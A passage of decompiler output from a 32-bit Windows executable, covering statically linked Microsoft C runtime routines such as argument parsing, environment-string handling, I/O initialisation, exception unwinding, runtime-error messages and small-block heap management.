  unsigned __int8 **v7; // edi
  unsigned __int8 *v8; // eax
  unsigned __int8 v9; // dl
  unsigned __int8 v10; // dl
  unsigned int v11; // ebx
  unsigned int v12; // edx
  unsigned int v13; // ebx
  unsigned int v14; // ebx
  unsigned __int8 v15; // dl
  _DWORD *result; // eax
  int v17; // [esp+14h] [ebp+8h]
  BOOL v18; // [esp+24h] [ebp+18h]

  *a5 = 0;
  v6 = a3;
  v7 = a2;
  *a4 = 1;
  v8 = a1;
  if ( a2 )
  {
    *a2 = a3;
    v7 = ++a2;
  }
  if ( *a1 == 34 )
  {
    while ( 1 )
    {
      v9 = *++v8;
      if ( v9 == 34 || !v9 )
        break;
      if ( (byte_494D61[v9] & 4) != 0 )
      {
        ++*a5;
        if ( v6 )
          *v6++ = *v8++;
      }
      ++*a5;
      if ( v6 )
        *v6++ = *v8;
    }
    ++*a5;
    if ( v6 )
      *v6++ = 0;
    if ( *v8 == 34 )
      ++v8;
  }
  else
  {
    do
    {
      ++*a5;
      if ( v6 )
        *v6++ = *v8;
      v10 = *v8++;
      if ( (byte_494D61[v10] & 4) != 0 )
      {
        ++*a5;
        if ( v6 )
          *v6++ = *v8;
        ++v8;
      }
      if ( v10 == 32 )
        break;
      if ( !v10 )
      {
        --v8;
        goto LABEL_28;
      }
    }
    while ( v10 != 9 );
    if ( v6 )
      *(v6 - 1) = 0;
  }
LABEL_28:
  v18 = 0;
  while ( *v8 )
  {
    while ( *v8 == 32 || *v8 == 9 )
      ++v8;
    if ( !*v8 )
      break;
    if ( v7 )
    {
      *v7++ = v6;
      a2 = v7;
    }
    ++*a4;
    while ( 1 )
    {
      v17 = 1;
      v11 = 0;
      while ( *v8 == 92 )
      {
        ++v8;
        ++v11;
      }
      if ( *v8 == 34 )
      {
        if ( (v11 & 1) == 0 )
        {
          if ( v18 && v8[1] == 34 )
            ++v8;
          else
            v17 = 0;
          v7 = a2;
          v18 = !v18;
        }
        v11 >>= 1;
      }
      v12 = v11;
      v13 = v11 - 1;
      if ( v12 )
      {
        v14 = v13 + 1;
        do
        {
          if ( v6 )
            *v6++ = 92;
          ++*a5;
          --v14;
        }
        while ( v14 );
      }
      v15 = *v8;
      if ( !*v8 || !v18 && (v15 == 32 || v15 == 9) )
        break;
      if ( v17 )
      {
        if ( v6 )
        {
          if ( (byte_494D61[v15] & 4) != 0 )
          {
            *v6++ = v15;
            ++v8;
            ++*a5;
          }
          *v6++ = *v8;
        }
        else if ( (byte_494D61[v15] & 4) != 0 )
        {
          ++v8;
          ++*a5;
        }
        ++*a5;
      }
      ++v8;
    }
    if ( v6 )
      *v6++ = 0;
    ++*a5;
  }
  if ( v7 )
    *v7 = 0;
  result = a4;
  ++*a4;
  return result;
}
// 40A6E5: conditional instruction was optimized away because of 'dl.1 in (==9|==20)'

//----- (0040A7F0) --------------------------------------------------------
CHAR *__crtGetEnvironmentStringsA()
{
  CHAR *v0; // ebx
  WCHAR *v1; // esi
  LPCH v2; // edi
  WCHAR *i; // eax
  int v4; // eax
  int v5; // ebp
  CHAR *v6; // eax
  LPCH j; // eax
  size_t v9; // ebp
  void *v10; // eax
  void *v11; // esi
  CHAR *lpMem; // [esp+10h] [ebp-8h]
  int cchWideChar; // [esp+14h] [ebp-4h]

  v0 = 0;
  v1 = 0;
  v2 = 0;
  if ( dword_493AA8 )
  {
    if ( dword_493AA8 == 1 )
      goto LABEL_7;
    if ( dword_493AA8 != 2 )
      return 0;
  }
  else
  {
    v1 = GetEnvironmentStringsW();
    if ( v1 )
    {
      dword_493AA8 = 1;
LABEL_7:
      if ( v1 || (v1 = GetEnvironmentStringsW()) != 0 )
      {
        for ( i = v1; *i; ++i )
        {
          do
            ++i;
          while ( *i );
        }
        cchWideChar = i - v1 + 1;
        v4 = WideCharToMultiByte(0, 0, v1, cchWideChar, 0, 0, 0, 0);
        v5 = v4;
        if ( v4 )
        {
          v6 = (CHAR *)sub_409613(v4);
          lpMem = v6;
          if ( v6 )
          {
            if ( !WideCharToMultiByte(0, 0, v1, cchWideChar, v6, v5, 0, 0) )
            {
              free(lpMem);
              lpMem = 0;
            }
            v0 = lpMem;
          }
        }
        FreeEnvironmentStringsW(v1);
        return v0;
      }
      return 0;
    }
    v2 = GetEnvironmentStrings();
    if ( !v2 )
      return 0;
    dword_493AA8 = 2;
  }
  if ( !v2 )
  {
    v2 = GetEnvironmentStrings();
    if ( !v2 )
      return 0;
  }
  for ( j = v2; *j; ++j )
  {
    do
      ++j;
    while ( *j );
  }
  v9 = j - v2 + 1;
  v10 = sub_409613(v9);
  v11 = v10;
  if ( v10 )
    sub_407C00((unsigned int)v10, v2, v9);
  else
    v11 = 0;
  FreeEnvironmentStringsA(v2);
  return (CHAR *)v11;
}
// 493AA8: using guessed type int dword_493AA8;

//----- (0040A922) --------------------------------------------------------
UINT _ioinit()
{
  char *v0; // esi
  unsigned int i; // eax
  signed int v2; // esi
  LPBYTE v3; // ebp
  HANDLE *v4; // ebx
  _DWORD *v5; // edi
  char *v6; // eax
  unsigned int j; // ecx
  int k; // edi
  int v9; // eax
  int l; // ebx
  int v11; // esi
  DWORD v12; // eax
  HANDLE v13; // eax
  HANDLE v14; // edi
  DWORD v15; // eax
  struct _STARTUPINFOA StartupInfo; // [esp+10h] [ebp-44h] BYREF

  v0 = (char *)sub_409613(0x100u);
  if ( !v0 )
    _amsg_exit(0x1Bu);
  dword_494B20[0] = (int)v0;
  uNumber = 32;
  for ( i = (unsigned int)(v0 + 256); (unsigned int)v0 < i; i = dword_494B20[0] + 256 )
  {
    v0[4] = 0;
    *(_DWORD *)v0 = -1;
    v0[5] = 10;
    v0 += 8;
  }
  GetStartupInfoA(&StartupInfo);
  if ( StartupInfo.cbReserved2 && StartupInfo.lpReserved2 )
  {
    v2 = *(_DWORD *)StartupInfo.lpReserved2;
    v3 = StartupInfo.lpReserved2 + 4;
    v4 = (HANDLE *)&StartupInfo.lpReserved2[*(_DWORD *)StartupInfo.lpReserved2 + 4];
    if ( *(int *)StartupInfo.lpReserved2 >= 2048 )
      v2 = 2048;
    if ( (int)uNumber < v2 )
    {
      v5 = &unk_494B24;
      while ( 1 )
      {
        v6 = (char *)sub_409613(0x100u);
        if ( !v6 )
          break;
        uNumber += 32;
        *v5 = v6;
        for ( j = (unsigned int)(v6 + 256); (unsigned int)v6 < j; j = *v5 + 256 )
        {
          v6[4] = 0;
          *(_DWORD *)v6 = -1;
          v6[5] = 10;
          v6 += 8;
        }
        ++v5;
        if ( (int)uNumber >= v2 )
          goto LABEL_19;
      }
      v2 = uNumber;
    }
LABEL_19:
    for ( k = 0; k < v2; ++v4 )
    {
      if ( *v4 != (HANDLE)-1 && (*v3 & 1) != 0 && ((*v3 & 8) != 0 || GetFileType(*v4)) )
      {
        v9 = dword_494B20[k >> 5] + 8 * (k & 0x1F);
        *(_DWORD *)v9 = *v4;
        *(_BYTE *)(v9 + 4) = *v3;
      }
      ++k;
      ++v3;
    }
  }
  for ( l = 0; l < 3; ++l )
  {
    v11 = dword_494B20[0] + 8 * l;
    if ( *(_DWORD *)v11 == -1 )
    {
      *(_BYTE *)(v11 + 4) = -127;
      if ( l )
        v12 = -(l != 1) - 11;
      else
        v12 = -10;
      v13 = GetStdHandle(v12);
      v14 = v13;
      if ( v13 == (HANDLE)-1 || (v15 = GetFileType(v13)) == 0 || (*(_DWORD *)v11 = v14, (unsigned __int8)v15 == 2) )
      {
        *(_BYTE *)(v11 + 4) |= 0x40u;
      }
      else if ( (unsigned __int8)v15 == 3 )
      {
        *(_BYTE *)(v11 + 4) |= 8u;
      }
    }
    else
    {
      *(_BYTE *)(v11 + 4) |= 0x80u;
    }
  }
  return SetHandleCount(uNumber);
}
// 494B20: using guessed type int dword_494B20[];

//----- (0040AACD) --------------------------------------------------------
int __cdecl _heap_init(int a1)
{
  hHeap = HeapCreate(a1 == 0, 0x1000u, 0);
  if ( !hHeap )
    return 0;
  if ( !__sbh_heap_init() )
  {
    HeapDestroy(hHeap);
    return 0;
  }
  return 1;
}

//----- (0040AB0C) --------------------------------------------------------
void __cdecl __spoils<eax,ecx,edx> _global_unwind2(PVOID TargetFrame)
{
  RtlUnwind(TargetFrame, &loc_40AB24, 0, 0);
}

//----- (0040AB2C) --------------------------------------------------------
int __cdecl _unwind_handler(int a1, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    *a4 = a2;
    result = 3;
  }
  return result;
}

//----- (0040AB4E) --------------------------------------------------------
int __usercall _local_unwind2@<eax>(int a1@<ebp>, int a2, int a3)
{
  int result; // eax
  int v4; // ebx
  int v5; // esi
  int v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-8h] [ebp-1Ch]
  int (__cdecl *v8)(int, int, int, _DWORD *); // [esp-4h] [ebp-18h]

  v8 = _unwind_handler;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  while ( 1 )
  {
    result = a2;
    v4 = *(_DWORD *)(a2 + 8);
    v5 = *(_DWORD *)(a2 + 12);
    if ( v5 == -1 || v5 == a3 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_40ABE2(*(_DWORD *)(v4 + 4 * v6 + 8), a1, 257);
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int, int, _DWORD *)))(v4 + 4 * v6 + 8))(
        v7,
        v8);
    }
  }
  return result;
}
// 40ABA2: variable 'v7' is possibly undefined
// 40ABA2: variable 'v8' is possibly undefined

//----- (0040ABE2) --------------------------------------------------------
int __userpurge sub_40ABE2@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_412CD4[2] = *(_DWORD *)(a2 + 8);
  dword_412CD4[1] = result;
  dword_412CD4[3] = a2;
  return result;
}

//----- (0040AC04) --------------------------------------------------------
int __cdecl _except_handler3(int a1, PVOID TargetFrame, int a3)
{
  int *v3; // ebp
  _DWORD *v4; // ebx
  int v5; // esi
  int v6; // edi
  int v7; // eax
  int v8; // edi
  int v9; // ecx
  int result; // eax
  int v11[2]; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = &savedregs;
  v4 = TargetFrame;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    _local_unwind2((int)TargetFrame + 16, (int)TargetFrame, -1);
    result = 1;
  }
  else
  {
    v11[0] = a1;
    v11[1] = a3;
    *((_DWORD *)TargetFrame - 1) = v11;
    v5 = *((_DWORD *)TargetFrame + 3);
    v6 = *((_DWORD *)TargetFrame + 2);
    while ( v5 != -1 )
    {
      if ( *(_DWORD *)(v6 + 12 * v5 + 4) )
      {
        v7 = (*(int (**)(void))(v6 + 12 * v5 + 4))();
        v4 = (_DWORD *)v3[3];
        if ( v7 )
        {
          if ( v7 < 0 )
            return 0;
          v8 = v4[2];
          _global_unwind2((PVOID)v3[3]);
          v3 = v4 + 4;
          _local_unwind2((int)(v4 + 4), (int)v4, v5);
          sub_40ABE2(*(_DWORD *)(v8 + 12 * v5 + 8), (int)(v4 + 4), 1);
          v4[3] = *(_DWORD *)(v8 + 4 * v9);
          (*(void (**)(void))(v8 + 4 * v9 + 8))();
        }
      }
      v6 = v4[2];
      v5 = *(_DWORD *)(v6 + 12 * v5);
    }
    result = 1;
  }
  return result;
}
// 40AC81: variable 'v9' is possibly undefined

//----- (0040ACDC) --------------------------------------------------------
int *_FF_MSGBANNER()
{
  int *result; // eax

  result = (int *)dword_493928;
  if ( dword_493928 == 1 || !dword_493928 && dword_412914 == 1 )
  {
    _NMSG_WRITE(0xFCu);
    if ( dword_493AAC )
      dword_493AAC();
    result = _NMSG_WRITE(0xFFu);
  }
  return result;
}
// 412914: using guessed type int dword_412914;
// 493928: using guessed type int dword_493928;
// 493AAC: using guessed type int (*dword_493AAC)(void);

//----- (0040AD15) --------------------------------------------------------
int *__cdecl _NMSG_WRITE(DWORD NumberOfBytesWritten)
{
  int v1; // ecx
  int *result; // eax
  int v3; // esi
  char *v4; // edi
  const char **v5; // esi
  HANDLE v6; // eax
  const char *v7; // [esp-14h] [ebp-1B8h]
  DWORD v8; // [esp-10h] [ebp-1B4h]
  char *v9; // [esp-Ch] [ebp-1B0h]
  char *v10; // [esp-8h] [ebp-1ACh]
  CHAR Filename[260]; // [esp+0h] [ebp-1A4h] BYREF
  char Destination[160]; // [esp+104h] [ebp-A0h] BYREF
  int savedregs; // [esp+1A4h] [ebp+0h] BYREF

  v1 = 0;
  result = dword_412CE8;
  do
  {
    if ( NumberOfBytesWritten == *result )
      break;
    result += 2;
    ++v1;
  }
  while ( (int)result < (int)&unk_412D78 );
  v3 = 2 * v1;
  if ( NumberOfBytesWritten == dword_412CE8[2 * v1] )
  {
    result = (int *)dword_493928;
    if ( dword_493928 == 1 || !dword_493928 && dword_412914 == 1 )
    {
      v5 = (const char **)&(&off_412CEC)[v3];
      v10 = 0;
      v9 = (char *)&NumberOfBytesWritten;
      v8 = strlen(*v5);
      v7 = *v5;
      v6 = GetStdHandle(0xFFFFFFF4);
      result = (int *)WriteFile(v6, v7, v8, &NumberOfBytesWritten, 0);
    }
    else if ( NumberOfBytesWritten != 252 )
    {
      if ( !GetModuleFileNameA(0, Filename, 0x104u) )
      {
        v10 = aProgramNameUnk;
        v9 = Filename;
        sub_407750();
      }
      v4 = Filename;
      if ( strlen(Filename) + 1 > 0x3C )
      {
        v4 = (char *)&savedregs + strlen(Filename) - 479;
        strncpy(v4, asc_40D5B8, 3u);
      }
      v9 = aRuntimeErrorPr;
      v8 = (DWORD)Destination;
      sub_407750();
      strcat(Destination, v4);
      strcat(Destination, asc_40D598);
      strcat(Destination, (&off_412CEC)[v3]);
      result = (int *)__crtMessageBoxA((int)Destination, (int)aMicrosoftVisua, 73744);
    }
  }
  return result;
}
// 412914: using guessed type int dword_412914;
// 412CE8: using guessed type int dword_412CE8[];
// 412CEC: using guessed type char *off_412CEC;
// 493928: using guessed type int dword_493928;

//----- (0040AE68) --------------------------------------------------------
BOOL __cdecl __crtGetStringTypeA(DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType, UINT CodePage, LCID Locale, int a7)
{
  int v7; // eax
  LCID v8; // eax
  int v10; // eax
  size_t v11; // edi
  int v12; // eax
  void *v13; // esp
  int v14; // eax
  WCHAR v15[8]; // [esp+0h] [ebp-34h] BYREF
  WCHAR *v16; // [esp+10h] [ebp-24h]
  int cchWideChar; // [esp+14h] [ebp-20h]
  WORD CharType; // [esp+18h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h]

  v7 = dword_493AB0;
  if ( !dword_493AB0 )
  {
    if ( GetStringTypeW(1u, &SrcStr, 1, &CharType) )
    {
      v7 = 1;
    }
    else
    {
      if ( !GetStringTypeA(0, 1u, byte_40D24C, 1, &CharType) )
        return 0;
      v7 = 2;
    }
    dword_493AB0 = v7;
  }
  if ( v7 != 2 )
  {
    if ( v7 == 1 )
    {
      if ( !CodePage )
        CodePage = dword_49394C;
      v10 = MultiByteToWideChar(CodePage, a7 != 0 ? 9 : 1, lpSrcStr, cchSrc, 0, 0);
      cchWideChar = v10;
      if ( v10 )
      {
        v11 = 2 * v10;
        v12 = 2 * v10 + 3;
        LOBYTE(v12) = v12 & 0xFC;
        v13 = alloca(v12);
        ms_exc.old_esp = (DWORD)v15;
        v16 = v15;
        memset(v15, 0, v11);
        ms_exc.registration.TryLevel = -1;
        if ( v15 )
        {
          v14 = MultiByteToWideChar(CodePage, 1u, lpSrcStr, cchSrc, v15, cchWideChar);
          if ( v14 )
            return GetStringTypeW(dwInfoType, v15, v14, lpCharType);
        }
      }
    }
    return 0;
  }
  v8 = Locale;
  if ( !Locale )
    v8 = dword_49393C;
  return GetStringTypeA(v8, dwInfoType, lpSrcStr, cchSrc, lpCharType);
}
// 493AB0: using guessed type int dword_493AB0;

//----- (0040AFC0) --------------------------------------------------------
char *__cdecl strncpy(char *Destination, const char *Source, size_t Count)
{
  size_t v3; // ecx
  size_t v4; // ebx
  const char *v5; // esi
  char *v6; // edi
  size_t v7; // ecx
  char v8; // al
  size_t v10; // ecx
  int v11; // eax
  int v12; // edx

  v3 = Count;
  if ( !Count )
    return Destination;
  v4 = Count;
  v5 = Source;
  v6 = Destination;
  if ( ((unsigned __int8)Source & 3) == 0 )
  {
    v7 = Count >> 2;
    if ( Count >> 2 )
      goto LABEL_21;
LABEL_10:
    while ( 1 )
    {
      v8 = *v5++;
      *v6++ = v8;
      if ( !v8 )
        break;
      if ( !--v4 )
        return Destination;
    }
    while ( --v4 )
LABEL_17:
      *v6++ = v8;
    return Destination;
  }
  do
  {
    v8 = *v5++;
    *v6++ = v8;
    if ( !--v3 )
      return Destination;
    if ( !v8 )
    {
      while ( ((unsigned __int8)v6 & 3) != 0 )
      {
        *v6++ = 0;
        if ( !--v3 )
          return Destination;
      }
      v4 = v3;
      v10 = v3 >> 2;
      if ( !v10 )
        goto LABEL_17;
      goto LABEL_31;
    }
  }
  while ( ((unsigned __int8)v5 & 3) != 0 );
  LOBYTE(v4) = v3;
  v7 = v3 >> 2;
  if ( !v7 )
  {
LABEL_9:
    v4 &= 3u;
    if ( v4 )
      goto LABEL_10;
    return Destination;
  }
  while ( 1 )
  {
LABEL_21:
    v11 = (*(_DWORD *)v5 + 2130640639) ^ ~*(_DWORD *)v5;
    v12 = *(_DWORD *)v5;
    v5 += 4;
    if ( (v11 & 0x81010100) == 0 )
      goto LABEL_20;
    if ( !(_BYTE)v12 )
      break;
    if ( !BYTE1(v12) )
    {
      *(_DWORD *)v6 = (unsigned __int8)v12;
      goto LABEL_30;
    }
    if ( (v12 & 0xFF0000) == 0 )
    {
      *(_DWORD *)v6 = (unsigned __int16)v12;
      goto LABEL_30;
    }
    if ( (v12 & 0xFF000000) == 0 )
    {
      *(_DWORD *)v6 = v12;
      goto LABEL_30;
    }
LABEL_20:
    *(_DWORD *)v6 = v12;
    v6 += 4;
    if ( !--v7 )
      goto LABEL_9;
  }
  *(_DWORD *)v6 = 0;
LABEL_30:
  v6 += 4;
  v8 = 0;
  v10 = v7 - 1;
  if ( v10 )
  {
LABEL_31:
    v8 = 0;
    do
    {
      *(_DWORD *)v6 = 0;
      v6 += 4;
      --v10;
    }
    while ( v10 );
  }
  v4 &= 3u;
  if ( v4 )
    goto LABEL_17;
  return Destination;
}

//----- (0040B0BE) --------------------------------------------------------
int __cdecl _lseek(int FileHandle, int Offset, int Origin)
{
  int v3; // esi
  void *v4; // eax
  int v5; // ebx
  unsigned int v6; // eax

  if ( FileHandle < uNumber
    && (v3 = 8 * (FileHandle & 0x1F), (*(_BYTE *)(dword_494B20[FileHandle >> 5] + v3 + 4) & 1) != 0) )
  {
    v4 = (void *)_get_osfhandle(FileHandle);
    if ( v4 == (void *)-1 )
    {
      dword_493954 = 9;
    }
    else
    {
      v5 = SetFilePointer(v4, Offset, 0, Origin);
      if ( v5 == -1 )
        v6 = GetLastError();
      else
        v6 = 0;
      if ( !v6 )
      {
        *(_BYTE *)(dword_494B20[FileHandle >> 5] + v3 + 4) &= 0xFDu;
        return v5;
      }
      _dosmaperr(v6);
    }
  }
  else
  {
    dword_493958 = 0;
    dword_493954 = 9;
  }
  return -1;
}
// 493954: using guessed type int dword_493954;
// 493958: using guessed type int dword_493958;
// 494B20: using guessed type int dword_494B20[];

//----- (0040B158) --------------------------------------------------------
int __cdecl _write(int a1, const void *lpBuffer, unsigned int nNumberOfBytesToWrite)
{
  int *v3; // ebx
  int v4; // esi
  char v5; // al
  int v7; // eax
  char *v8; // eax
  char *v9; // ecx
  char v10; // cl
  signed int v11; // edi
  char Buffer[1028]; // [esp+Ch] [ebp-414h] BYREF
  int v13; // [esp+410h] [ebp-10h]
  DWORD NumberOfBytesWritten; // [esp+414h] [ebp-Ch] BYREF
  DWORD v15; // [esp+418h] [ebp-8h]
  char *v16; // [esp+41Ch] [ebp-4h]
  int v17; // [esp+428h] [ebp+8h]

  if ( a1 < uNumber && (v3 = &dword_494B20[a1 >> 5], v4 = 8 * (a1 & 0x1F), v5 = *(_BYTE *)(*v3 + v4 + 4), (v5 & 1) != 0) )
  {
    v15 = 0;
    v13 = 0;
    if ( !nNumberOfBytesToWrite )
      return 0;
    if ( (v5 & 0x20) != 0 )
      _lseek(a1, 0, 2);
    v7 = v4 + *v3;
    if ( *(char *)(v7 + 4) >= 0 )
    {
      if ( WriteFile(*(HANDLE *)v7, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
      {
        v17 = 0;
        v15 = NumberOfBytesWritten;
      }
      else
      {
        v17 = GetLastError();
      }
    }
    else
    {
      v16 = (char *)lpBuffer;
      v17 = 0;
      while ( 1 )
      {
        v8 = Buffer;
        do
        {
          if ( v16 - (_BYTE *)lpBuffer >= nNumberOfBytesToWrite )
            break;
          v9 = v16++;
          v10 = *v9;
          if ( v10 == 10 )
          {
            ++v13;
            *v8++ = 13;
          }
          *v8++ = v10;
        }
        while ( v8 - Buffer < 1024 );
        v11 = v8 - Buffer;
        if ( !WriteFile(*(HANDLE *)(*v3 + v4), Buffer, v8 - Buffer, &NumberOfBytesWritten, 0) )
          break;
        v15 += NumberOfBytesWritten;
        if ( (int)NumberOfBytesWritten < v11 || v16 - (_BYTE *)lpBuffer >= nNumberOfBytesToWrite )
          goto LABEL_17;
      }
      v17 = GetLastError();
    }
LABEL_17:
    if ( v15 )
      return v15 - v13;
    if ( v17 )
    {
      if ( v17 == 5 )
      {
        dword_493954 = 9;
        dword_493958 = 5;
      }
      else
      {
        _dosmaperr(v17);
      }
    }
    else
    {
      if ( (*(_BYTE *)(*v3 + v4 + 4) & 0x40) != 0 && *(_BYTE *)lpBuffer == 26 )
        return 0;
      dword_493954 = 28;
      dword_493958 = 0;
    }
  }
  else
  {
    dword_493958 = 0;
    dword_493954 = 9;
  }
  return -1;
}
// 40B1D3: conditional instruction was optimized away because of '%nNumberOfBytesToWrite.4!=0'
// 493954: using guessed type int dword_493954;
// 493958: using guessed type int dword_493958;
// 494B20: using guessed type int dword_494B20[];

//----- (0040B305) --------------------------------------------------------
int __cdecl _getbuf(_DWORD *a1)
{
  void *v1; // eax
  int result; // eax

  ++dword_493AB4;
  v1 = sub_409613(0x1000u);
  a1[2] = v1;
  if ( v1 )
  {
    a1[3] |= 8u;
    a1[6] = 4096;
  }
  else
  {
    a1[3] |= 4u;
    a1[2] = a1 + 5;
    a1[6] = 2;
  }
  result = a1[2];
  a1[1] = 0;
  *a1 = result;
  return result;
}
// 493AB4: using guessed type int dword_493AB4;

//----- (0040B349) --------------------------------------------------------
int __cdecl _isatty(int FileHandle)
{
  int result; // eax

  if ( FileHandle < uNumber )
    result = *(_BYTE *)(dword_494B20[FileHandle >> 5] + 8 * (FileHandle & 0x1F) + 4) & 0x40;
  else
    result = 0;
  return result;
}
// 494B20: using guessed type int dword_494B20[];

//----- (0040B428) --------------------------------------------------------
int __cdecl wctomb(char *lpMultiByteStr, wchar_t WideCharStr)
{
  int result; // eax

  result = (int)lpMultiByteStr;
  if ( lpMultiByteStr )
  {
    if ( !dword_49393C )
    {
      if ( WideCharStr <= 0xFFu )
      {
        *lpMultiByteStr = WideCharStr;
        return 1;
      }
      goto LABEL_7;
    }
    lpMultiByteStr = 0;
    result = WideCharToMultiByte(
               dword_49394C,
               0x220u,
               &WideCharStr,
               1,
               (LPSTR)result,
               cbMultiByte,
               0,
               (LPBOOL)&lpMultiByteStr);
    if ( !result || lpMultiByteStr )
    {
LABEL_7:
      dword_493954 = 42;
      return -1;
    }
  }
  return result;
}
// 493954: using guessed type int dword_493954;

//----- (0040B575) --------------------------------------------------------
int __sbh_heap_init()
{
  int result; // eax

  result = (int)HeapAlloc(hHeap, 0, 0x140u);
  lpMem = (LPVOID)result;
  if ( result )
  {
    dword_493AD8 = 0;
    dword_493ADC = 0;
    dword_493AD4 = result;
    dword_493ACC = 16;
    result = 1;
  }
  return result;
}
// 493ACC: using guessed type int dword_493ACC;
// 493AD4: using guessed type int dword_493AD4;
// 493AD8: using guessed type int dword_493AD8;
// 493ADC: using guessed type int dword_493ADC;

//----- (0040B5B3) --------------------------------------------------------
char *__cdecl __sbh_find_block(int a1)
{
  char *result; // eax

  for ( result = (char *)lpMem; result < (char *)lpMem + 20 * dword_493ADC; result += 20 )
  {
    if ( (unsigned int)(a1 - *((_DWORD *)result + 3)) < 0x100000 )
      return result;
  }
  return 0;
}
// 493ADC: using guessed type int dword_493ADC;

//----- (0040B5DE) --------------------------------------------------------
int __cdecl __sbh_free_block(_DWORD *a1, unsigned int a2)
{
  int v2; // eax
  int *v3; // edx
  unsigned int v4; // esi
  int v5; // ebx
  int v6; // ecx
  _BYTE *v7; // ecx
  unsigned int v8; // edi
  bool v9; // zf
  _BYTE *v10; // ecx
  unsigned int v11; // edi
  int v12; // ecx
  int v13; // edi
  unsigned int v14; // edi
  unsigned int v15; // ecx
  _BYTE *v16; // ecx
  unsigned int v17; // edx
  _BYTE *v18; // ecx
  unsigned int v19; // edx
  _DWORD *v20; // ecx
  int result; // eax
  int v22; // eax
  _DWORD *v23; // [esp+10h] [ebp-10h]
  int v24; // [esp+14h] [ebp-Ch]
  int v25; // [esp+18h] [ebp-8h]
  int *v26; // [esp+18h] [ebp-8h]
  int v27; // [esp+1Ch] [ebp-4h]
  char v28; // [esp+2Fh] [ebp+Fh]

  v2 = a1[4];
  v3 = (int *)(a2 - 4);
  v4 = (a2 - a1[3]) >> 15;
  v5 = *(_DWORD *)(a2 - 4) - 1;
  v27 = *(_DWORD *)(a2 - 8);
  v24 = v5;
  v23 = (_DWORD *)(516 * v4 + v2 + 324);
  v6 = *(_DWORD *)(v5 + a2 - 4);
  v25 = v6;
  if ( (v6 & 1) == 0 )
  {
    a2 = (v6 >> 4) - 1;
    if ( a2 > 0x3F )
      a2 = 63;
    if ( *(int *)((char *)v3 + v5 + 4) == *(int *)((char *)v3 + v5 + 8) )
    {
      if ( a2 >= 0x20 )
      {
        v10 = (_BYTE *)(a2 + v2 + 4);
        v11 = ~(0x80000000 >> (a2 - 32));
        *(_DWORD *)(v2 + 4 * v4 + 196) &= v11;
        v9 = (*v10)-- == 1;
        if ( v9 )
          a1[1] &= v11;
      }
      else
      {
        v7 = (_BYTE *)(a2 + v2 + 4);
        v8 = ~(0x80000000 >> a2);
        *(_DWORD *)(v2 + 4 * v4 + 68) &= v8;
        v9 = (*v7)-- == 1;
        if ( v9 )
          *a1 &= v8;
      }
    }
    *(_DWORD *)(*(int *)((char *)v3 + v5 + 8) + 4) = *(int *)((char *)v3 + v5 + 4);
    v12 = *(int *)((char *)v3 + v5 + 4);
    v13 = *(int *)((char *)v3 + v5 + 8);
    v5 += v25;
    *(_DWORD *)(v12 + 8) = v13;
    v24 = v5;
  }
  v14 = (v5 >> 4) - 1;
  if ( v14 > 0x3F )
    v14 = 63;
  if ( (v27 & 1) == 0 )
  {
    v26 = (int *)((char *)v3 - v27);
    v15 = (v27 >> 4) - 1;
    a2 = v15;
    if ( v15 > 0x3F )
    {
      a2 = 63;
      v15 = 63;
    }
    v5 += v27;
    v24 = v5;
    v14 = (v5 >> 4) - 1;
    if ( v14 > 0x3F )
      v14 = 63;
    if ( v15 != v14 )
    {
      if ( v26[1] == v26[2] )
      {
        if ( a2 >= 0x20 )
        {
          v18 = (_BYTE *)(a2 + v2 + 4);
          v19 = ~(0x80000000 >> (a2 - 32));
          *(_DWORD *)(v2 + 4 * v4 + 196) &= v19;
          v9 = (*v18)-- == 1;
          if ( v9 )
            a1[1] &= v19;
        }
        else
        {
          v16 = (_BYTE *)(a2 + v2 + 4);
          v17 = ~(0x80000000 >> a2);
          *(_DWORD *)(v2 + 4 * v4 + 68) &= v17;
          v9 = (*v16)-- == 1;
          if ( v9 )
            *a1 &= v17;
        }
      }
      *(_DWORD *)(v26[2] + 4) = v26[1];
      *(_DWORD *)(v26[1] + 8) = v26[2];
    }
    v3 = v26;
  }
  if ( (v27 & 1) != 0 || a2 != v14 )
  {
    v3[1] = v23[2 * v14 + 1];
    v20 = &v23[2 * v14];
    v3[2] = (int)v20;
    v20[1] = v3;
    *(_DWORD *)(v3[1] + 8) = v3;
    if ( v3[1] == v3[2] )
    {
      v28 = *(_BYTE *)(v14 + v2 + 4);
      *(_BYTE *)(v14 + v2 + 4) = v28 + 1;
      if ( v14 >= 0x20 )
      {
        if ( !v28 )
          a1[1] |= 0x80000000 >> (v14 - 32);
        *(_DWORD *)(v2 + 4 * v4 + 196) |= 0x80000000 >> (v14 - 32);
      }
      else
      {
        if ( !v28 )
          *a1 |= 0x80000000 >> v14;
        *(_DWORD *)(v2 + 4 * v4 + 68) |= 0x80000000 >> v14;
      }
      v5 = v24;
    }
  }
  result = 516 * v4 + v2 + 324;
  *v3 = v5;
  *(int *)((char *)v3 + v5 - 4) = v5;
  v9 = (*v23)-- == 1;
  if ( v9 )
  {
    if ( !dword_493AD8 )
      goto LABEL_46;
    VirtualFree((LPVOID)(*(_DWORD *)(dword_493AD8 + 12) + (dword_493AD0 << 15)), 0x8000u, 0x4000u);
    *(_DWORD *)(dword_493AD8 + 8) |= 0x80000000 >> dword_493AD0;
    *(_DWORD *)(*(_DWORD *)(dword_493AD8 + 16) + 4 * dword_493AD0 + 196) = 0;
    --*(_BYTE *)(*(_DWORD *)(dword_493AD8 + 16) + 67);
    v22 = dword_493AD8;
    if ( !*(_BYTE *)(*(_DWORD *)(dword_493AD8 + 16) + 67) )
    {
